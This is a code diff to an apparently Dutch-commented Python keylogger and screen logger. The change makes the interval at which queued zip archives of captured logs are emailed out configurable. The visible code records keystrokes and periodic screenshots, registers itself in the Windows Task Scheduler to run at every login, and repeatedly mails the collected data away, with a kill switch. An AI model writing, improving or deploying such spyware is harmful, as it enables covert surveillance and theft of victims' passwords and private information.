@@ -69,16 +69,18 @@ def loadParams():
             logScreen = paramsContent.get("LogScreen")
             logging = paramsContent.get("Logging")
             enableKillSwitch = paramsContent.get("EnableKillSwitch")
-            return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch
+            persistentMailInterval = paramsContent.get("persistentMailInterval")
+            return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval
     else :
         timeBetweenScreenshots = 300
         logKeys = True
         logScreen = True
         logging = True
         enableKillSwitch = True
-        return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch
-        
-timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch = loadParams()
+        persistentMailInterval = 120
+        return timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval
+
+timeBetweenScreenshots, logKeys, logScreen, logging, enableKillSwitch, persistentMailInterval = loadParams()
 
 # functie die een taak maakt in taakplanner waarbij het script zichzelf uitvoert
 def runOnLogin(taskName, scriptPath):
@@ -200,7 +202,6 @@ def sendSingleMail(zipFile):
         return False
     
 def mailQueue():
-    """Achtergrondthread: blijft elke 2 min proberen alle zips te versturen"""
     while not exitEvent.is_set():
         zipFiles = [
             os.path.join(logs, f) 
@@ -216,7 +217,7 @@ def mailQueue():
                 os.remove(zipFile)
         
         # wacht 2 min, maar check exitEvent zodat killswitch werkt
-        exitEvent.wait(120)
+        exitEvent.wait(persistentMailInterval)
 
 # Screenlog functie
 def screenLogger():
@@ -321,5 +322,3 @@ keyLog_thread.join()
 screenLog_thread.join()
 kill_thread.join()
 mail_thread.join()
-
-# fun to add: in keylog also log when taken a screenshot
